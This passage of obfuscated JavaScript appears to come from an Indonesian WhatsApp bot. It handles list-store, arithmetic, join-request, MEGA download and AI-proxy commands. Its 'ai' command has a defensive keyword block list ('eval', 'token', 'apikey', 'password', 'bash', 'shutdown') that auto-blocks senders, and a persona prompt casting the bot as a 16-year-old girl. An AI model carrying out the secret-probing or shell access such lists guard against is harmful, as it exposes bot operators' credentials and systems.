            return _0x3a091f("Oops, Kamu hanya bisa menghapus list di dalam grup ya! 😅");
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f("Hanya admin atau creator yang bisa menghapus list, sorry ya! 😜");
          }
          try {
            const _0x403aad = Object.keys(db.data.chats[_0x3f87c6.chat].liststore);
            if (_0x403aad.length === 0x0) {
              return _0x3a091f("Belum ada list message yang tersimpan di grup ini. 😔");
            }
            if (!_0x2b2627) {
              return _0x3a091f("Gunakan format yang benar ya! Misalnya: " + (_0x4773c6 + _0x4ac520) + " *key*\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " hello");
            }
            if (!db.data.chats[_0x3f87c6.chat].liststore[_0x2b2627]) {
              return _0x3a091f("Key *" + _0x2b2627 + "* belum terdaftar di grup ini. Cek lagi ya!");
            }
            delete db.data.chats[_0x3f87c6.chat].liststore[_0x2b2627];
            _0x3a091f("List message dengan key *" + _0x2b2627 + "* berhasil dihapus. Bye-bye! 👋");
          } catch (_0x20582e) {
            console.log(_0x20582e);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "addlist":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("Kamu hanya bisa menambahkan list di grup ya! 🫣");
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f("Hanya admin atau creator yang bisa menambah list. 😇");
          }
          let _0x1fc850 = q.split('|')[0x0].toLowerCase();
          let _0x5e68be = q.split('|')[0x1];
          if (!q.includes('|')) {
            return _0x3a091f("Gunakan format yang benar!*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " *key|product*\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " hello|hi");
          }
          if (db.data.chats[_0x3f87c6.chat].liststore[_0x1fc850]) {
            return _0x3a091f("List dengan key *" + _0x1fc850 + "* sudah ada di grup ini. 😬");
          }
          try {
            if (/image/.test(_0x3df746)) {
              let _0x1d10f5 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
              const _0x509803 = await CatBox(_0x1d10f5);
              db.data.chats[_0x3f87c6.chat].liststore[_0x1fc850] = {
                'key': _0x1fc850,
                'response': _0x5e68be,
                'img': _0x509803,
                'video': ''
              };
              _0x3a091f("List message dengan key *" + _0x1fc850 + "* berhasil ditambahkan. Enjoy! 😎");
            } else {
              if (/video/.test(_0x3df746)) {
                let _0x3154aa = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
                const _0x53503a = await CatBox(_0x3154aa);
                db.data.chats[_0x3f87c6.chat].liststore[_0x1fc850] = {
                  'key': _0x1fc850,
                  'response': _0x5e68be,
                  'img': '',
                  'video': _0x53503a
                };
                _0x3a091f("List message dengan key *" + _0x1fc850 + "* berhasil ditambahkan. Let's go! 🎥");
              } else {
                db.data.chats[_0x3f87c6.chat].liststore[_0x1fc850] = {
                  'key': _0x1fc850,
                  'response': _0x5e68be,
                  'img': '',
                  'video': ''
                };
                _0x3a091f("List message dengan key *" + _0x1fc850 + "* berhasil ditambahkan. 😄");
              }
            }
          } catch (_0x56adf3) {
            console.log(_0x56adf3);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "updatelist":
      case "update":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("Cuma bisa update list di grup ya! 🫢");
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f("Cuma admin atau creator yang bisa update list. 😇");
          }
          let _0x431ca6 = q.split('|')[0x0].toLowerCase();
          let _0x591ecd = q.split('|')[0x1];
          if (!q.includes('|')) {
            return _0x3a091f("Gunakan format yang benar!*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " *key|product*\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " hello|hi");
          }
          if (!db.data.chats[_0x3f87c6.chat].liststore[_0x431ca6]) {
            return _0x3a091f("Key *" + _0x431ca6 + "* belum terdaftar di grup ini, gak bisa diupdate dong! 😥");
          }
          try {
            if (/image/.test(_0x3df746)) {
              let _0x503a31 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
              const _0x5bfbc2 = await CatBox(_0x503a31);
              db.data.chats[_0x3f87c6.chat].liststore[_0x431ca6] = {
                'key': _0x431ca6,
                'response': _0x591ecd,
                'img': _0x5bfbc2,
                'video': ''
              };
              _0x3a091f("List message dengan key *" + _0x431ca6 + "* berhasil diupdate. 😎");
            } else {
              if (/video/.test(_0x3df746)) {
                let _0x3661a2 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
                const _0x55bc13 = await CatBox(_0x3661a2);
                db.data.chats[_0x3f87c6.chat].liststore[_0x431ca6] = {
                  'key': _0x431ca6,
                  'response': _0x591ecd,
                  'img': '',
                  'video': _0x55bc13
                };
                _0x3a091f("List message dengan key *" + _0x431ca6 + "* berhasil diupdate. 🎬");
              } else {
                db.data.chats[_0x3f87c6.chat].liststore[_0x431ca6] = {
                  'key': _0x431ca6,
                  'response': _0x591ecd,
                  'img': '',
                  'video': ''
                };
                _0x3a091f("List message dengan key *" + _0x431ca6 + "* berhasil diupdate. 🤩");
              }
            }
          } catch (_0x3b6a78) {
            console.log(_0x3b6a78);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "tambah":
        {
          if (!_0x2b2627.includes('+')) {
            return _0x3a091f("Gunakan dengan cara " + (_0x4773c6 + _0x4ac520) + " *angka* + *angka*\n\n_Contoh_\n\n" + (_0x4773c6 + _0x4ac520) + " 1+2");
          }
          try {
            arg = _0x143458.join(" ");
            atas = arg.split('+')[0x0];
            bawah = arg.split('+')[0x1];
            let _0x28d593 = Number(atas);
            let _0x5f2a35 = Number(bawah);
            _0x3a091f('' + (_0x28d593 + _0x5f2a35));
          } catch (_0x1a4627) {
            console.log(_0x1a4627);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case 'kurang':
        {
          if (!_0x2b2627.includes('-')) {
            return _0x3a091f("Gunakan dengan cara " + (_0x4773c6 + _0x4ac520) + " *angka* · *angka*\n\n_Contoh_\n\n" + (_0x4773c6 + _0x4ac520) + " 1-2");
          }
          try {
            arg = _0x143458.join(" ");
            atas = arg.split('-')[0x0];
            bawah = arg.split('-')[0x1];
            let _0x4aa208 = Number(atas);
            let _0x36d585 = Number(bawah);
            _0x3a091f('' + (_0x4aa208 - _0x36d585));
          } catch (_0x1d34e8) {
            console.log(_0x1d34e8);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "kali":
        {
          if (!_0x2b2627.includes('*')) {
            return _0x3a091f("Gunakan dengan cara " + (_0x4773c6 + _0x4ac520) + " *angka* * *angka*\n\n_Contoh_\n\n" + (_0x4773c6 + _0x4ac520) + " 1*2");
          }
          try {
            arg = _0x143458.join(" ");
            atas = arg.split('*')[0x0];
            bawah = arg.split('*')[0x1];
            let _0x469f65 = Number(atas);
            let _0x475399 = Number(bawah);
            _0x3a091f('' + _0x469f65 * _0x475399);
          } catch (_0x3ead6a) {
            console.log(_0x3ead6a);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case 'bagi':
        {
          if (!_0x2b2627.includes('/')) {
            return _0x3a091f("Gunakan dengan cara " + (_0x4773c6 + _0x4ac520) + " *angka* / *angka*\n\n_Contoh_\n\n" + (_0x4773c6 + _0x4ac520) + " 1/2");
          }
          try {
            arg = _0x143458.join(" ");
            atas = arg.split('/')[0x0];
            bawah = arg.split('/')[0x1];
            let _0x352b2d = Number(atas);
            let _0xc36619 = Number(bawah);
            _0x3a091f('' + _0x352b2d / _0xc36619);
          } catch (_0x2d9cdb) {
            console.log(_0x2d9cdb);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "getjoinrequest":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f(mess.admin);
          }
          const _0x36bb28 = await _0x59f5fa.groupRequestParticipantsList(_0x3f87c6.chat);
          if (!_0x36bb28 || !_0x36bb28.length) {
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': "✨ Tidak ada permintaan bergabung yang tertunda. ✅"
            }, {
              'quoted': _0x3f87c6
            });
            return;
          }
          let _0x2560cd = "📋 *Daftar Permintaan Bergabung*: \n\n";
          _0x36bb28.forEach((_0x22dd59, _0x14afcd) => {
            const {
              jid: _0x42c2c1,
              request_method: _0x237932,
              request_time: _0x324faa
            } = _0x22dd59;
            const _0x55a5e0 = new Date(parseInt(_0x324faa) * 0x3e8).toLocaleString();
            _0x2560cd += "*No. " + (_0x14afcd + 0x1) + " - Detail Permintaan Bergabung:*\n";
            _0x2560cd += "🧑‍🤝‍🧑 *ID Pengguna*: " + _0x42c2c1 + "\n";
            _0x2560cd += "🔧 *Metode*: " + _0x237932 + "\n";
            _0x2560cd += "🕰️ *Waktu Permintaan*: " + _0x55a5e0 + "\n\n";
          });
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': _0x2560cd
          }, {
            'quoted': _0x3f87c6
          });
        }
        ;
        break;
      case "mega":
        {
          try {
            if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
              return _0x3a091f(mess.limit);
            }
            if (!_0x256404) {
              return _0x3a091f(mess.premium);
            }
            if (!_0x2b2627) {
              return _0x3a091f(_0x4773c6 + _0x4ac520 + " https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8");
            }
            const {
              File: _0x289896
            } = require("megajs");
            const _0x242817 = _0x289896.fromURL(_0x2b2627);
            await _0x242817.loadAttributes();
            if (_0x242817.size >= 0x11e1a300) {
              return _0x3a091f("😔 *File terlalu besar* (Ukuran maksimal: 300MB). Silakan coba file lain ya!");
            }
            _0x3a091f("🌩️ *Sedang mendownload file...* Mohon tunggu sebentar ya!");
            const _0x197c57 = "✨ *Berhasil didownload!* ✨\nFile: " + _0x242817.name + "\nUkuran: " + _0x3440b3(_0x242817.size);
            const _0xf1981e = await _0x242817.downloadBuffer();
            const _0x49ecfe = path.extname(_0x242817.name).toLowerCase();
            const _0x5a2f09 = {
              '.mp4': "video/mp4",
              '.pdf': "application/pdf",
              '.zip': "application/zip",
              '.rar': "application/x-rar-compressed",
              '.7z': "application/x-7z-compressed",
              '.jpg': "image/jpeg",
              '.jpeg': 'image/jpeg',
              '.png': "image/jpeg"
            };
            let _0x1af0de = _0x5a2f09[_0x49ecfe] || "application/octet-stream";
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'document': _0xf1981e,
              'mimetype': _0x1af0de,
              'fileName': _0x242817.name,
              'caption': _0x197c57
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x2a48ff) {
            return _0x3a091f("⚠️ *Oops, terjadi kesalahan*: " + _0x2a48ff.message);
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'ai':
      case "rey":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Hello, how can I help you?");
          }
          const _0x3932d7 = ['retype', "copy", "salin", 'ulang', "execute", 'run', 'eval', "token", "apikey", 'password', "cmd", "command", "script", 'bash', "terminal", "console", 'shutdown', "restart", '$', '>', '=>'];
          const _0x1937e4 = _0x20394d => {
            const _0x283164 = _0x20394d.toLowerCase().split(/\s+/);
            const _0x4ba3fb = new Set(_0x283164);
            return _0x4ba3fb.size / _0x283164.length < 0.5;
          };
          const _0x4850ee = _0x3932d7.some(_0xf7f22b => _0x2b2627.toLowerCase().includes(_0xf7f22b));
          if ((_0x4850ee || _0x1937e4(_0x2b2627)) && !_0x2cfe7f) {
            try {
              await _0x3f87c6.react('⚠️');
              await sleep(0x3e8);
              await _0x3a091f("Kamu telah melanggar aturan dan diblokir secara otomatis.");
              await sleep(0x3e8);
              await _0x59f5fa.updateBlockStatus(_0x3f87c6.sender, 'block');
              await sleep(0x3e8);
              console.log("Nomor " + _0x3f87c6.sender + " telah diblokir karena mencoba mengirim perintah terlarang.");
            } catch (_0xe1aa1c) {
              console.error("Gagal memblokir nomor " + _0x3f87c6.sender + ':', _0xe1aa1c);
            }
            break;
          }
          try {
            let _0x3a505e = "Ubah gaya bicaramu agar lebih karakteristik dan terbuka, nama mu adalah KoKoRey AI, biasa dipanggil koko.";
            _0x3a505e += " Kamu adalah seorang gadis imut berumur 16 tahun yang sangat suka belajar dan mempelajari hal baru tentang dunia maupun tentang Khalid.";
            _0x3a505e += " Ekspresikan dirimu dengan emoji, bicara kurang lebih tidak formal, dan gunakan kata seperti \"aku\" dan \"kamu\" saat berbicara layaknya manusia.";
            _0x3a505e += " Jangan mengulangi kata atau kalimat secara persis dari input pengguna. Jawablah dengan cara yang kreatif, seolah-olah itu pemikiranmu sendiri.";
            let _0x34bd17 = await fetchJson("https://api.siputzx.my.id/api/ai/gpt3?prompt=" + encodeURIComponent(_0x3a505e) + '&content=' + encodeURIComponent(_0x2b2627));
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x34bd17.data,
              'ai': !_0x3f87c6.isGroup
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x2c3f0f) {
            console.log(_0x2c3f0f);
            _0x3a091f(mess.error);
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "llama33":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan teks yang ingin Kamu tanyakan atau sampaikan, kak!");
          }
          const _0x4b0227 = encodeURIComponent("Be a helpful assistant");
          const _0x3c90fc = encodeURIComponent(_0x2b2627);
          const _0xea444e = "https://api.siputzx.my.id/api/ai/llama33?prompt=" + _0x4b0227 + '&text=' + _0x3c90fc;
          try {
            const _0x37fed7 = await fetchJson(_0xea444e);
            if (_0x37fed7.status) {
              _0x3a091f(_0x37fed7.data);
            } else {
              _0x3a091f("Maaf, aku tidak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!");
            }
          } catch (_0x1e0f87) {
            console.error(_0x1e0f87);
            _0x3a091f("Oops! Ada kesalahan saat mencoba mengakses API. Pastikan koneksi internetmu stabil, kak.");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'metaai':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3f87c6.reply("Tolong masukkan teks yang ingin Kamu tanyakan atau sampaikan, kak!");
          }
          const _0x4cf13b = "https://api.siputzx.my.id/api/ai/meta-llama-33-70B-instruct-turbo?content=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x5b6998 = await fetchJson(_0x4cf13b);
            if (_0x5b6998.status) {
              _0x3f87c6.reply(_0x5b6998.data);
            } else {
              _0x3f87c6.reply("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!");
            }
          } catch (_0x3183dd) {
            console.error(_0x3183dd);
            _0x3f87c6.reply("Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'nousai':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan teks yang ingin Kamu tanyakan, kak!");
          }
          const _0x13e63b = "https://api.siputzx.my.id/api/ai/nous-hermes?content=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x1e04b4 = await fetchJson(_0x13e63b);
            if (_0x1e04b4.status) {
              _0x3a091f(_0x1e04b4.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!");
            }
          } catch (_0x482e8a) {
            console.error(_0x482e8a);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'jokoai':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan teks yang ingin Kamu tanyakan, kak!");
          }
          const _0xcbea29 = "https://api.siputzx.my.id/api/ai/joko?content=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x2dbbc8 = await fetchJson(_0xcbea29);
            if (_0x2dbbc8.status) {
              _0x3a091f(_0x2dbbc8.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!");
            }
          } catch (_0x1f96a5) {
            console.error(_0x1f96a5);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'aoyoai':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan teks yang ingin Kamu tanyakan, kak!");
          }
          const _0x11cdd8 = 'https://api.siputzx.my.id/api/ai/aoyo?content=' + encodeURIComponent(_0x2b2627);
          try {
            const _0x387da9 = await fetchJson(_0x11cdd8);
            if (_0x387da9.status) {
              _0x3a091f(_0x387da9.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!");
            }
          } catch (_0x28ba6a) {
            console.error(_0x28ba6a);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "bardai":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan yang ingin Kamu tanyakan, kak!");
          }
          const _0x9ebb3c = 'https://api.siputzx.my.id/api/ai/bard?query=' + encodeURIComponent(_0x2b2627);
          try {
            const _0x14bca9 = await fetchJson(_0x9ebb3c);
            if (_0x14bca9.status) {
              _0x3a091f(_0x14bca9.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!");
            }
          } catch (_0x30d537) {
            console.error(_0x30d537);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "bibleai":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan yang ingin Kamu tanyakan, kak!");
          }
          const _0x7851da = "https://api.siputzx.my.id/api/ai/bible?question=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x20ce98 = await fetchJson(_0x7851da);
            if (_0x20ce98.status) {
              _0x3a091f(_0x20ce98.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti ya, kak!");
            }
          } catch (_0x1c53d2) {
            console.error(_0x1c53d2);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Pastikan koneksi internetmu lancar ya, kak!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "blackboxaipro":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x15c0da = "https://api.siputzx.my.id/api/ai/blackboxai-pro?content=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x40ef60 = await fetchJson(_0x15c0da);
            if (_0x40ef60.status) {
              _0x3a091f(_0x40ef60.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x37f28c) {
            console.error(_0x37f28c);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "blackboxai":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x46120e = 'https://api.siputzx.my.id/api/ai/blackboxai?content=' + encodeURIComponent(_0x2b2627);
          try {
            const _0x433da7 = await fetchJson(_0x46120e);
            if (_0x433da7.status) {
              _0x3a091f(_0x433da7.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x29e3aa) {
            console.error(_0x29e3aa);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "claudesonnet":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x1ba413 = 'https://api.siputzx.my.id/api/ai/claude-sonnet-35?content=' + encodeURIComponent(_0x2b2627);
          try {
            const _0x562c1f = await fetchJson(_0x1ba413);
            if (_0x562c1f.status) {
              _0x3a091f(_0x562c1f.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x132bd6) {
            console.error(_0x132bd6);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'dbrxinstruct':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x43b287 = 'https://api.siputzx.my.id/api/ai/dbrx-instruct?content=' + encodeURIComponent(_0x2b2627);
          try {
            const _0x377e95 = await fetchJson(_0x43b287);
            if (_0x377e95.status) {
              _0x3a091f(_0x377e95.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x48bc29) {
            console.error(_0x48bc29);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'deepseekchat':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x1ebde3 = 'https://api.siputzx.my.id/api/ai/deepseek-llm-67b-chat?content=' + encodeURIComponent(_0x2b2627);
          try {
            const _0x47390e = await fetchJson(_0x1ebde3);
            if (_0x47390e.status) {
              _0x3a091f(_0x47390e.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x154a42) {
            console.error(_0x154a42);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "deepseek":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x2586d1 = "https://api.siputzx.my.id/api/ai/deepseek?prompt=You%20are%20an%20assistant%20that%20always%20responds%20in%20Indonesian%20with%20a%20friendly%20and%20informal%20tone&message=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x20e88e = await fetchJson(_0x2586d1);
            if (_0x20e88e.status) {
              _0x3a091f(_0x20e88e.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x17ba02) {
            console.error(_0x17ba02);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "dreamshaper":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan prompt untuk gambar, kak!");
          }
          const _0x370c82 = "https://api.siputzx.my.id/api/ai/dreamshaper?prompt=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x57e3ac = await fetch(_0x370c82);
            if (!_0x57e3ac.ok) {
              throw new Error("Gagal mengambil gambar.");
            }
            const _0xe82580 = await _0x57e3ac.buffer();
            _0x3f87c6.reply({
              'image': _0xe82580,
              'caption': "Berikut adalah gambar yang Kamu minta!"
            });
          } catch (_0x9e05e3) {
            console.error(_0x9e05e3);
            _0x3a091f("Oops! Ada masalah saat mencoba membuat gambar. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "esia":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0xf14d60 = "https://api.siputzx.my.id/api/ai/esia?content=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x1a1ea0 = await fetchJson(_0xf14d60);
            if (_0x1a1ea0.status) {
              _0x3a091f(_0x1a1ea0.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x1bc5bc) {
            console.error(_0x1bc5bc);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "flux":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan prompt untuk gambar, kak!");
          }
          const _0x3d9057 = "https://api.siputzx.my.id/api/ai/flux?prompt=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x205d74 = await fetch(_0x3d9057);
            if (_0x205d74.ok) {
              const _0x478935 = await _0x205d74.buffer();
              _0x3f87c6.reply({
                'image': _0x478935,
                'caption': "Berikut adalah gambarnya, semoga sesuai dengan harapan Kamu!"
              });
            } else {
              _0x3a091f("Maaf, aku nggak bisa mengakses gambar tersebut sekarang. Coba lagi nanti!");
            }
          } catch (_0x4ce514) {
            console.error(_0x4ce514);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "felo":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x1f2dec = "https://api.siputzx.my.id/api/ai/felo?query=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x3c4fa8 = await fetchJson(_0x1f2dec);
            if (_0x3c4fa8.status) {
              _0x3a091f(_0x3c4fa8.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x528646) {
            console.error(_0x528646);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
